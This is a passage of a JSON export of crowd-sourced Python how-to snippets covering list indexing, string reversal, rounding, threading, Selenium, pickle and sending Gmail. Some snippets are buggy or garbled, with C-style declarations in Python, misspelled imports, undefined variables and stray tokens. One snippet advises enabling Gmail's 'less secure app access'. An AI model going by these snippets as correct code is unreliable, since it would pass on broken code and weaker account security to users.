    "description": "# Example usage: your_list = ['The answer to', 'the ultimate question', 'of life',       'the universe', 'and everything', 'is 42']  [idx for idx, elem in enumerate(your_list) if 'universe' in elem][0] --> 3 # The 0-based index of the first list element containing \"universe\"\n# Basic syntax using list comprehension: [i for i, n in enumerate(your_list) if n == condition][match_number] # Where: #\t- This setup makes a list of the indexes for list items that meet #\t\tthe condition and then match_number returns the nth index #\t- enumerate() returns iterates through your_list and returns each #\t\telement (n) and index value (i)  # Example usage: your_list = ['w', 'e', 's', 's', 's', 'z','z', 's'] [i for i, n in enumerate(your_list) if n == 's'][0] --> 2 # 2 is returned because it is the index of the first element that #\tmeets the condition (being 's')\n# Basic syntax: list.index(element, start, end)  # Where: #\t- Element is the item you're looking for in the list # \t- Start is optional, and is the list index you want to start at #\t- End is option, and is the list index you want to stop searching at  # Note, Python is 0-indexed  # Example usage: my_list = [1, 2, 3, 4, 5, 6, 7, 8, 42, 9, 10] my_list.index(42) --> 8\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3816,
    "keyword": null,
    "link": null,
    "title": " python reverse linked list",
    "description": "def reverseLinkedList(root):     cur = root     prev = None          while cur:         nxt = cur.next         cur.next = prev         prev = cur         cur = nxt      return prev\nclass LinkedList {         static Node head;         static class Node {             int data;          Node next;             Node(int d)          {              data = d;              next = null;          }      }         /* Function to reverse the linked list */     Node reverse(Node node)      {          Node prev = null;          Node current = node;          Node next = null;          while (current != null) {              next = current.next;              current.next = prev;              prev = current;              current = next;          }          node = prev;          return node;      }         // prints content of double linked list      void printList(Node node)      {          while (node != null) {              System.out.print(node.data + \" \");              node = node.next;          }      }         public static void main(String[] args)      {          LinkedList list = new LinkedList();          list.head = new Node(85);          list.head.next = new Node(15);          list.head.next.next = new Node(4);          list.head.next.next.next = new Node(20);             System.out.println(\"Given Linked list\");          list.printList(head);          head = list.reverse(head);          System.out.println(\"\");          System.out.println(\"Reversed linked list \");          list.printList(head);      }  } \n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3817,
    "keyword": null,
    "link": null,
    "title": " python reverse string",
    "description": "'String'[::-1] #-> 'gnirtS'\n'hello world'[::-1] 'dlrow olleh'\n# in order to make a string reversed in python  # you have to use the slicing as following  string = \"racecar\" print(string[::-1]) \nstr=\"Python\" # initial string stringlength=len(str) # calculate length of the list slicedString=str[stringlength::-1] # slicing  print (slicedString) # print the reversed string\nreversed_string = input_string[::-1]\n>>> 'a string'[::-1] 'gnirts a'\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3818,
    "keyword": null,
    "link": null,
    "title": " python rickroll code",
    "description": "#pip intstall webrowser import webbrowser url =  \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" webbrowser.open_new(url)\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3819,
    "keyword": null,
    "link": null,
    "title": " python roll a die",
    "description": "import random  roll = random.randint(1, 6) # random result 1-6\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3820,
    "keyword": null,
    "link": null,
    "title": " python roll dice 100 times",
    "description": "import random  roll = [random.randint(1,6) for x in range(100)]  print(roll)\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3821,
    "keyword": null,
    "link": null,
    "title": " python rolling mean",
    "description": "#Create a rolling window of 10 sequential values data.rolling(window=10).mean()\n",
    "reg_date": "2021-10-12T11:34:06.000Z"
  },
  {
    "id": 3822,
    "keyword": null,
    "link": null,
    "title": " python rotate screen",
    "description": "pip install rotate-screen\n#pip install rotate-screen import rotatescreen import time screen = rotatescreen.get_primary_display() for i in range(4):     time.sleep(3)     screen.rotate_to(i*90 % 360)  \n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3823,
    "keyword": null,
    "link": null,
    "title": " python round down to nearest multiple of number",
    "description": "# Basic syntax: import math math.floor(larger_number / multiple) * multiple  # Example usage: # Say you want to get the nearest multiple of 5 less than 29 import math math.floor(29 / 5) * 5 --> 25  # Note, you can also do this with div if you don't want to import math 29 // 5 * 5  # Note, to get the nearest multiple of 5 greater than 29 run: math.ceil(29 / 5) * 5 --> 30\ndef rof(x):   '''round up to multiple of 5'''     if x%5==4:         x+=1     elif x%5==3:         x+=2     print(x)\n#round up to multiple of 5 from both end def rof(x,y,z):     if x%5==4:         x+=1     elif x%5==1:         x-=1     elif x%5==2:         x-=2  \n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3824,
    "keyword": null,
    "link": null,
    "title": " python round number numpy",
    "description": "x = np.round(x, decimals = 4)\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3825,
    "keyword": null,
    "link": null,
    "title": " python round to dp",
    "description": "round(float_num, num_of_decimals)\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3826,
    "keyword": null,
    "link": null,
    "title": " python round up",
    "description": ">>> import math  >>> math.ceil(5.2) 6  >>> math.ceil(5) 5  >>> math.ceil(-0.5) 0\nint x = 6.3456824221  #round(number_to_roundoff, round_off_till) #round_off_till is optional  print(round(x))    \t\t#output: 6 print(round(x, 3)) \t\t#output: 6.346 print(round(x, 1)  \t\t#output: 6.3\n>>>import math >>> math.floor(1.6) 1 >>> math.floor(2) 2 >>> math.floor(3.9) 3\n>>> int(1.6) 1 >>> int(2) 2 >>> int(3.9) 3\n>>> import math  >>> math.ceil(1.2) 2  >>> math.ceil(2) 2  >>> math.ceil(-0.5) 0 \n>>> import math  >>> math.ceil(3.2) # round up 4\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3827,
    "keyword": null,
    "link": null,
    "title": " python run 2 functions at the same time",
    "description": "from threading import Thread  def func1():     print('worker 1')  def func2():     print(\"worker 2\")  if __name__ == '__main__':     a = Thread(target = func1)     b = Thread(target = func2)     a.start()     b.start()\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3828,
    "keyword": null,
    "link": null,
    "title": " python run code if main",
    "description": "if __name__ == \"__main__\":   # Code inside of here will only run if the python script was launched directly   # This code will not run if imported as a module\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3829,
    "keyword": null,
    "link": null,
    "title": " python run server",
    "description": "python3 -m http.server 8000 # LINUX  python -m http.server 8000 # WINDOWS\n# If Python version returned above is 3.X python3 -m http.server # On windows try \"python\" instead of \"python3\", or \"py -3\" # If Python version returned above is 2.X python -m SimpleHTTPServer\nOn Ubuntu go to Commands and hit these two commands-> cd folderName python3 -m http.server 8080\npython -m http.server --directory /tmp/ \n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3830,
    "keyword": null,
    "link": null,
    "title": " python running multiple threads at the same time",
    "description": "from threading import Thread from time import sleep # use Thread to run def in background # Example: def func1():     while True:         sleep(1)         print(\"Working\")  def func2():     while True:         sleep(2)         print(\"Working2\")  if __name__ == '__main__':     Thread(target = func1).start()     Thread(target = func2).start()\nimport multiprocessing  def worker(num):     \"\"\" Worker procedure     \"\"\"     print('Worker:', str(num))  # Mind the \"if\" instruction! if __name__ == '__main__':     jobs = [] # list of jobs     jobs_num = 5 # number of workers     for i in range(jobs_num):         # Declare a new process and pass arguments to it         p1 = multiprocessing.Process(target=worker, args=(i,))         jobs.append(p1)         # Declare a new process and pass arguments to it         p2 = multiprocessing.Process(target=worker, args=(i+10,))         jobs.append(p2)         p1.start() # starting workers         p2.start() # starting workers\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3831,
    "keyword": null,
    "link": null,
    "title": " python saveAsTextFile",
    "description": "samples = sc.parallelize([     (\"abonsanto@fakemail.com\", \"Alberto\", \"Bonsanto\"),     (\"mbonsanto@fakemail.com\", \"Miguel\", \"Bonsanto\"),     (\"stranger@fakemail.com\", \"Stranger\", \"Weirdo\"),     (\"dbonsanto@fakemail.com\", \"Dakota\", \"Bonsanto\") ])  print samples.collect()  samples.saveAsTextFile(\"folder/here.txt\") read_rdd = sc.textFile(\"folder/here.txt\")  read_rdd.collect()\n",
    "reg_date": "2021-10-12T11:34:07.000Z"
  },
  {
    "id": 3832,
    "keyword": null,
    "link": null,
    "title": " python save a dictionary as an object",
    "description": "import pickle  dictionary_data = {\"a\": 1, \"b\": 2}  # SAVE with open(\"data.pkl\", \"wb\") as pkl_handle: \tpickle.dump(dictionary_data, pkl_handle)  # LOAD with open(\"data.pkl\", \"rb\") as pkl_handle: \toutput = pickle.load(pkl_handle)      print(output)\ndict = {'Python' : '.py', 'C++' : '.cpp', 'Java' : '.java'} f = open(\"dict.txt\",\"w\") f.write( str(dict) ) f.close()\n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3833,
    "keyword": null,
    "link": null,
    "title": " python save df to csv",
    "description": "df.to_csv(r'/directory/path/file_name.csv', index = False, header = True)\ndf.to_csv('out.csv')\n>>> df = pd.DataFrame({'name': ['Raphael', 'Donatello'], ...                    'mask': ['red', 'purple'], ...                    'weapon': ['sai', 'bo staff']}) >>> df.to_csv(index=False) \n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3834,
    "keyword": null,
    "link": null,
    "title": " python save dictionary as text",
    "description": "with open('myfile.txt', 'w') as f:     print(mydictionary, file=f)\n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3835,
    "keyword": null,
    "link": null,
    "title": " python save figure",
    "description": "# Basic syntax: plt.savefig(\"/path/to/output/directory/figure.png\")  # Example usage: import matplotlib.pyplot as plt plt.figure() plt.plot(range(5)) plt.savefig(\"~/Documents/figure.png\", dpi=300)\nIn [5]: plt.savefig('books_read.png')\nplt.savefig('image.png')\nplt.savefig('books_read.png')\n#where to save the figures PROJECT_ROOT_DIR = \".\" CHAPTER_ID = \"classification\" IMAGES_PATH = os.path.join(PROJECT_ROOT_DIR, \"images\", CHAPTER_ID) os.makedirs(IMAGES_PATH, exist_ok = True)  def save_fig(fig_id, tight_layout=True, fig_extension=\"png\", resolution=300):     path = os.path.join(IMAGES_PATH, fig_id + \".\" + fig_extension)     print(\"Saving figure\", fig_id)     if tight_layout:         plt.tight_layout()     plt.savefig(path, format=fig_extension, dpi=resolution)\n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3836,
    "keyword": null,
    "link": null,
    "title": " python save figure as pdf",
    "description": "import matplotlib.pyplot as plt  f = plt.figure() plt.plot(range(10), range(10), \"o\") plt.show()  f.savefig(\"foo.pdf\", bbox_inches='tight')\n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3837,
    "keyword": null,
    "link": null,
    "title": " python save list items to dictionary",
    "description": "''' Converting a list to dictionary with list elements as keys in dictionary All keys will have same value '''  dictOfWords = { i : 5 for i in listOfStr } \n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3838,
    "keyword": null,
    "link": null,
    "title": " python saving a screentshot with PIL",
    "description": "#python 3 from PIL import ImageGrab  snapshot = ImageGrab.grab() save_path = \"C:\\\\Users\\\\YourUser\\\\Desktop\\\\MySnapshot.jpg\" #dont forget to write the name and the extension of the file in the end snapshot.save(save_path)\n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3839,
    "keyword": null,
    "link": null,
    "title": " python schedule",
    "description": "# to install schedule # RUN \"python -m pip install schedule\" in CMD  import schedule import time  def job():     print(\"I'm working...\")  schedule.every(10).minutes.do(job) schedule.every().hour.do(job) schedule.every().day.at(\"10:30\").do(job) schedule.every().monday.do(job) schedule.every().wednesday.at(\"13:15\").do(job) schedule.every().minute.at(\":17\").do(job)  while True:     schedule.run_pending()     time.sleep(1) \nfrom datetime import datetime  dt_obj = datetime.strptime('20.12.2016 09:38:42,76',                            '%d.%m.%Y %H:%M:%S,%f') millisec = dt_obj.timestamp() * 1000  print(millisec)\nimport schedule import time  def job():     print(\"I'm working...\")  schedule.every(10).seconds.do(job) schedule.every(10).minutes.do(job) schedule.every().hour.do(job) schedule.every().day.at(\"10:30\").do(job) schedule.every(5).to(10).minutes.do(job) schedule.every().monday.do(job) schedule.every().wednesday.at(\"13:15\").do(job) schedule.every().minute.at(\":17\").do(job)  while True:     schedule.run_pending()     time.sleep(1) \n$ pip install schedule \n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3840,
    "keyword": null,
    "link": null,
    "title": " python seaborn lmplot add title",
    "description": "sns.lmplot(x, y, data=df, hue=\"hue\") ax = plt.gca() ax.set_title(\"Graph (a)\") \n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3841,
    "keyword": null,
    "link": null,
    "title": " python seaborn violin plot fit data better",
    "description": "# Short answer: # Adjust the bandwidth parameter to smaller values. E.g. bw = 0.1  # Example usage: import numpy as np import seaborn as sns import matplotlib.pyplot as plt  data = np.random.rand(100) sns.violinplot(y=data, bw=0.1) # Changing the bw parameter adjusts how #\ttightly the data is fit by the kernel density estimate (KDE)\n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3842,
    "keyword": null,
    "link": null,
    "title": " python search for word is in column",
    "description": "df[df.column.str.contains(\"word\")] \n",
    "reg_date": "2021-10-12T11:34:08.000Z"
  },
  {
    "id": 3843,
    "keyword": null,
    "link": null,
    "title": " python search text corrector",
    "description": "#pip install pyspellchecker from spellchecker import SpellChecker  spell = SpellChecker()  # find those words that may be misspelled misspelled = spell.unknown(['something', 'is', 'hapenning', 'here'])  for word in misspelled:     # Get the one `most likely` answer     print(spell.correction(word))      # Get a list of `likely` options     print(spell.candidates(word))\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3844,
    "keyword": null,
    "link": null,
    "title": " python seek file beginning after for line in file",
    "description": "fileObject.seek(offset[, whence])\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3845,
    "keyword": null,
    "link": null,
    "title": " python selenium clear input",
    "description": "element = driver.find_element_by_xpath('//*') element = element.get_attribute('innerHTML')\ndriver.find_element_by_id('foo').clear()\ndriver.find_element_by_xpath(username_input).send_keys(&ldquo;username&rdquo;)driver.find_element_by_xpath(password_input).send_keys(&ldquo;password&rdquo;)driver.find_element_by_xpath(login_submit).click()\nelement.text\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3846,
    "keyword": null,
    "link": null,
    "title": " python selenium explicit wait",
    "description": "from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC  driver = webdriver.Firefox() driver.get(\"http://somedomain/url_that_delays_loading\") try:     element = WebDriverWait(driver, 10).until(         EC.presence_of_element_located((By.ID, \"myDynamicElement\"))     ) finally:     driver.quit()\nval = 20 # in seconds driver.implicitly_wait(val)\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3847,
    "keyword": null,
    "link": null,
    "title": " python selenium full screen",
    "description": "from selenuim import webdriver  webdriver.maximize_window()\nfrom selenium import webdriver from selenium.webdriver.chrome.options import Options  chrome_options = Options() chrome_options.add_argument(\"--kiosk\")  driver = webdriver.Chrome(chrome_options=chrome_options) driver.get('https://google.com')\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3848,
    "keyword": null,
    "link": null,
    "title": " python selenium get image src",
    "description": "driver.find_element_by_id(\"element_id\").get_attribute(\"src\")\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3849,
    "keyword": null,
    "link": null,
    "title": " python selenium get style",
    "description": "firefox = webdriver.Firefox() element = firefox.find_element_by_css_selector(\"this element css selector here\") attributeValue = element.get_attribute(\"style\")\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3850,
    "keyword": null,
    "link": null,
    "title": " python selenium go back",
    "description": " driver.execute_script(\"window.history.go(-1)\")\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3851,
    "keyword": null,
    "link": null,
    "title": " python selenium hidedevtools",
    "description": "# 1. Locate ...Lib\\site-packages\\selenium\\webdriver\\common\\service.py on Eexternal Libraries # 2. Scroll to Start() function # 3. Replace only the try part in:         from win32process import CREATE_NO_WINDOW         try:             cmd = [self.path]             cmd.extend(self.command_line_args())             self.process = subprocess.Popen(cmd, env=self.env,                                             close_fds=platform.system() != 'Windows',                                             creationflags=CREATE_NO_WINDOW,                                             stdout=self.log_file,                                             stderr=self.log_file,                                             stdin=PIPE) # (from the first \"try\" until the first \"exept\") # 4. Enjoy!  # credit: @Wahyu Bram\n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3852,
    "keyword": null,
    "link": null,
    "title": " python selenium hover over element",
    "description": "from selenium import webdriver from selenium.webdriver.common.action_chains import ActionChains  driver = webdriver.Firefox() driver.get('http://example.com') element_to_hover_over = firefox.find_element_by_id(\"foo\")  # actual hover ActionChains(driver).move_to_element(element_to_hover_over).perform()\nBy using Actions class  WebElement element = driver.findElement(By.xpath(\"xpath\")); Actions action = new Actions(driver); action.moveToElement(element).perform(); \n",
    "reg_date": "2021-10-12T11:34:09.000Z"
  },
  {
    "id": 3853,
    "keyword": null,
    "link": null,
    "title": " python selenium itemprop",
    "description": "# tags = [\"span\", \"div\", \"meta\", \"a\"] # attribute = in html: <span itemprop=\"ATTRIBUTE_HERE\"> driver.find_element_by_xpath(f\"//{tag}[@itemprop='{attribute}']\")\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3854,
    "keyword": null,
    "link": null,
    "title": " python selenium move cursor to element",
    "description": "from selenium import webdriver from selenium_move_cursor.MouseActions import move_to_element_chrome  driver = webdriver.Chrome(chrome_options=chrome_options)  driver.maximize_window()  driver.get(\"https://www.google.com/\") element = driver.find_elements_by_css_selector(\"input[class='gNO89b']\")[1]  move_to_element_chrome(driver, element, display_scaling=100, chrome_info_bar_shown=True)\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3855,
    "keyword": null,
    "link": null,
    "title": " python selenium partial class name",
    "description": "# If you want to find element by partial class name you have to use css_selector  element = driver.find_element_by_css_selector(\"div[class^='dx-close-button']\") element.click() # You don't need to specify the tag\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3856,
    "keyword": null,
    "link": null,
    "title": " python selenium run javascript",
    "description": "driver.execute_script('window.alert(\"worked!\")')\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3857,
    "keyword": null,
    "link": null,
    "title": " python selenium screenshot",
    "description": "driver.save_screenshot(\"screenshot.png\")\nfrom selenium import webdriver from time import sleep  driver = webdriver.Firefox() driver.get('https://www.python.org') sleep(1)  driver.get_screenshot_as_file(\"screenshot.png\") driver.quit() print(\"end...\")\nJava Yes, it is possible. The following example is in Java:  WebDriver driver = new FirefoxDriver(); driver.get(\"http://www.google.com/\"); File scrFile = ((TakesScreenshot)driver).getScreenshotAs(OutputType.FILE); // Now you can do whatever you need to do with it, for example copy somewhere FileUtils.copyFile(scrFile, new File(\"c:\\\\tmp\\\\screenshot.png\"));\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3858,
    "keyword": null,
    "link": null,
    "title": " python selenium scroll all down",
    "description": "from selenium import webdriver import time  browser = webdriver.Firefox() browser.get(\"https://en.wikipedia.org\") browser.execute_script(\"window.scrollTo(0,document.body.scrollHeight)\") time.sleep(3) browser.close()\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3859,
    "keyword": null,
    "link": null,
    "title": " python selenium select dropdown",
    "description": "from selenium import webdriver from selenium.webdriver.support.ui import Select  driver = webdriver.Firefox() driver.get('url')  select = Select(driver.find_element_by_id('fruits01'))  # select by visible text select.select_by_visible_text('Banana')  # select by value  select.select_by_value('1')\nHow do you handle Select type of dropdown?     - If it is <select> we would have to use Select class from Selenium.     - Methods to select from dropdown:         - selectByVisibleText         - selectByValue         - selectByIndex  --> How do we verify which option is selected in a dropdown?     - If we want to get the currently selected option,      we use getFirstSelectedOption() method.     getFirstSelectedOption();         -> return type: currently selected option as a web element --> .getOptions();     -> This method will return all of the options in the <select> web element.     -> return type: List<WebElement> \nHow do you handle Select type of dropdown?     - If it is <select> we would have to use Select class from Selenium.     - Methods to select from dropdown:         - selectByVisibleText         - selectByValue         - selectByIndex  --> How do we verify which option is selected in a dropdown?     - If we want to get the currently selected option,      we use getFirstSelectedOption() method.             -> return type: currently selected option as a web element --> .getOptions();     -> This method will return all of the options in the <select> web element.     -> return type: List<WebElement> \nit depends what kind of dropdown There are 2 dropdowns  1- HTML 2- SELECT  we determine what kind of dropdown it is  -By tagName.We inspect.If it has <select> tag, it means it is <select> dropdown.   -If it is HTML, we can locate and click just as any other web element.    I handle Select type of dropdown by using Select class from Selenium.      - Methods to select from dropdown:         - selectByVisibleText         - selectByValue         - selectByIndex           I verify which option is selected in a dropdown?  - If we want to get the currently selected option,   we use getFirstSelectedOption() method.         -> return type: currently selected option as a web element                  --> .getOptions();     -> This method will return all of the options in the <select> web element.     -> return type: List<WebElement>         \n# Just found a very simple solution for this annoying problem # Been looking around for days just to solve it, Selecting dropdowns without Select class  # Find your dropdown element by the following, finds the element in the dropdown named BRA Dropdown_Element = driver.find_element(By.XPATH, \"//*[text()='BRA']\").click()  # Store the ActionChains class inside the actions variable actions = ActionChains(driver)  # Click on the element using the click(on_element=) actions.click(on_element=Dropdown_Element) time.sleep(2) actions.perform()  # Hopes this helped :)\n1-Select dropdowns:are created by using <select> tag in HTML 2-HTML dropdowns:these are the dropdowns that are created NOT USING <select> These dropdowns are handled just like any other webElement.  Select select = new Select(driver.findElement(LOCATOR)); 1-selectByVisibleText(String arg);  2-byIndex(int arg); 3-byValue:     .getFirstSelectedOption() .getOptions();  .getAllSelectedOptions();.deSelectAll();\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3860,
    "keyword": null,
    "link": null,
    "title": " python send google email",
    "description": "from smtplib import SMTP  ''' !!! Note !!! https://myaccount.google.com/u/1/lesssecureapps?gar=1&pli=1&rapt=AEjHL4MdKbqmGDVY3kiBYKtpeM_epFUujma99D11-QkUh52EZnY1B077b6t81iePtPUigZVoTrOD9Gue1wUA2UVgFoC7rXnGdA go to this link and enable => Less secure app access  '''  server = SMTP('smtp.gmail.com',587) # TLS => 587  OR  SSL => 465  (TLS is more secure)  server.starttls() server.login('Sender@gmail.com','Sender_Password') server.sendmail('Sender@gmail.com','Receiver@gmail.com','message here') server.quit() \n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3861,
    "keyword": null,
    "link": null,
    "title": " python sentence splitter",
    "description": ">>> from nltk import tokenize >>> p = \"Good morning Dr. Adams. The patient is waiting for you in room number 3.\"  >>> tokenize.sent_tokenize(p) ['Good morning Dr. Adams.', 'The patient is waiting for you in room number 3.'] \n# -*- coding: utf-8 -*- import re alphabets= \"([A-Za-z])\" prefixes = \"(Mr|St|Mrs|Ms|Dr)[.]\" suffixes = \"(Inc|Ltd|Jr|Sr|Co)\" starters = \"(Mr|Mrs|Ms|Dr|He\\s|She\\s|It\\s|They\\s|Their\\s|Our\\s|We\\s|But\\s|However\\s|That\\s|This\\s|Wherever)\" acronyms = \"([A-Z][.][A-Z][.](?:[A-Z][.])?)\" websites = \"[.](com|net|org|io|gov)\"  def split_into_sentences(text):     text = \" \" + text + \"  \"     text = text.replace(\"\\n\",\" \")     text = re.sub(prefixes,\"\\\\1<prd>\",text)     text = re.sub(websites,\"<prd>\\\\1\",text)     if \"Ph.D\" in text: text = text.replace(\"Ph.D.\",\"Ph<prd>D<prd>\")     text = re.sub(\"\\s\" + alphabets + \"[.] \",\" \\\\1<prd> \",text)     text = re.sub(acronyms+\" \"+starters,\"\\\\1<stop> \\\\2\",text)     text = re.sub(alphabets + \"[.]\" + alphabets + \"[.]\" + alphabets + \"[.]\",\"\\\\1<prd>\\\\2<prd>\\\\3<prd>\",text)     text = re.sub(alphabets + \"[.]\" + alphabets + \"[.]\",\"\\\\1<prd>\\\\2<prd>\",text)     text = re.sub(\" \"+suffixes+\"[.] \"+starters,\" \\\\1<stop> \\\\2\",text)     text = re.sub(\" \"+suffixes+\"[.]\",\" \\\\1<prd>\",text)     text = re.sub(\" \" + alphabets + \"[.]\",\" \\\\1<prd>\",text)     if \"&rdquo;\" in text: text = text.replace(\".&rdquo;\",\"&rdquo;.\")     if \"\\\"\" in text: text = text.replace(\".\\\"\",\"\\\".\")     if \"!\" in text: text = text.replace(\"!\\\"\",\"\\\"!\")     if \"?\" in text: text = text.replace(\"?\\\"\",\"\\\"?\")     text = text.replace(\".\",\".<stop>\")     text = text.replace(\"?\",\"?<stop>\")     text = text.replace(\"!\",\"!<stop>\")     text = text.replace(\"<prd>\",\".\")     sentences = text.split(\"<stop>\")     sentences = sentences[:-1]     sentences = [s.strip() for s in sentences]     return sentences \n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3862,
    "keyword": null,
    "link": null,
    "title": " python set cwd to file location",
    "description": "import os  abspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname)\nos.chdir(os.path.dirname(__file__)) \nabspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname)\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3863,
    "keyword": null,
    "link": null,
    "title": " python set label colour",
    "description": "Label(bg=\"white\")\n",
    "reg_date": "2021-10-12T11:34:10.000Z"
  },
  {
    "id": 3864,
    "keyword": null,
    "link": null,
    "title": " python set recursion limit",
    "description": "import sys   sys.setrecursionlimit(10**6) \nimport sys sys.setrecursionlimit(2000) \n1500\n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3865,
    "keyword": null,
    "link": null,
    "title": " python sha256 of file",
    "description": "# Python program to find SHA256 hash string of a file import hashlib   filename = input(\"Enter the input file name: \") sha256_hash = hashlib.sha256() with open(filename,\"rb\") as f:     # Read and update hash string value in blocks of 4K     for byte_block in iter(lambda: f.read(4096),b\"\"):         sha256_hash.update(byte_block)     print(sha256_hash.hexdigest()) \nthianga\n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3866,
    "keyword": null,
    "link": null,
    "title": " python shebang",
    "description": "#!/usr/bin/env python3\n#!/usr/bin/python3\n#!/usr/bin/env python \ndadaist Apr 1 '20 at 8:11: \"If your script is Python 3 only  and your target system might have a Python 2 executable in PATH  then I recommend #!/usr/bin/env python3 instead.\" \n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3867,
    "keyword": null,
    "link": null,
    "title": " python shortest path of list of nodes site:stackoverflow.com",
    "description": "def short_path_length(row):     return nx.shortest_path_length(G, row['Orgin_nodes'], row['Destination_nodes'], weight='length')  df['short_path_length'] = df.apply(short_path_length, axis=1) \n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3868,
    "keyword": null,
    "link": null,
    "title": " python show all columns",
    "description": "pd.set_option('display.max_columns', None) movies.head()\npd.set_option('display.max_columns', None) pd.set_option('display.max_rows', None)\npd.set_option('max_columns', None)\npd.options.display.max_columns = None pd.options.display.max_rows = None\nprint(dataframe.columns)\npd.set_option('display.max_columns', None)movies.head()\n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3869,
    "keyword": null,
    "link": null,
    "title": " python show current time",
    "description": "import datetime   currentDT = datetime.datetime.now() print(str(currentDT))  # prints XXXX-XX-XX XX:XX:XX.XXXXXX # or  import datetime   currentDT = datetime.datetime.now()   print (\"Current Year is: %d\" % currentDT.year) print (\"Current Month is: %d\" % currentDT.month) print (\"Current Day is: %d\" % currentDT.day) print (\"Current Hour is: %d\" % currentDT.hour) print (\"Current Minute is: %d\" % currentDT.minute) print (\"Current Second is: %d\" % currentDT.second) print (\"Current Microsecond is: %d\" % currentDT.microsecond) # prints \"\"\" Current Year is: XXXX Current Month is: XX Current Day is: XX Current Hour is: XX Current Minute is: XX Current Second is: XX Current Microsecond is: XXXXXX \"\"\"\n from datetime import datetime  now = datetime.now()  current_time = now.strftime(\"%H:%M:%S\") print(\"Current Time =\", current_time) \nimport datetime now = datetime.datetime.now() print (\"Current date and time : \") print (now.strftime(\"%Y-%m-%d %H:%M:%S\"))  \nimport time  t = time.localtime() current_time = time.strftime(\"%H:%M:%S\", t) print(current_time) \n--------------------------------------------------------- import datetime   currentDateTime = datetime.datetime.now() print(currentDateTime) --------------------------------------------------------- OR --------------------------------------------------------- from datetime import datetime   currentDateTime = datetime.now() print(currentDateTime) --------------------------------------------------------- OR --------------------------------------------------------- import datetime  print(datetime.datetime.now()) --------------------------------------------------------- OR --------------------------------------------------------- from datetime import datetime   print(datetime.now()) ---------------------------------------------------------\n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3870,
    "keyword": null,
    "link": null,
    "title": " python show only 1st element of nested lists",
    "description": "myList = [[1,2,3],[4,5,6],[7,8,9]]  #Quick answer print([ele[0] for ele in myList])   #Prints [1, 4, 7]  #Other variations print([[ele[0]] for ele in myList]) #Prints [[1], [4], [7]] print([[ele[0] for ele in myList]]) #Prints [[1, 4, 7]] \n",
    "reg_date": "2021-10-12T11:34:11.000Z"
  },
  {
    "id": 3871,
    "keyword": null,
    "link": null,
    "title": " python shuffle list",
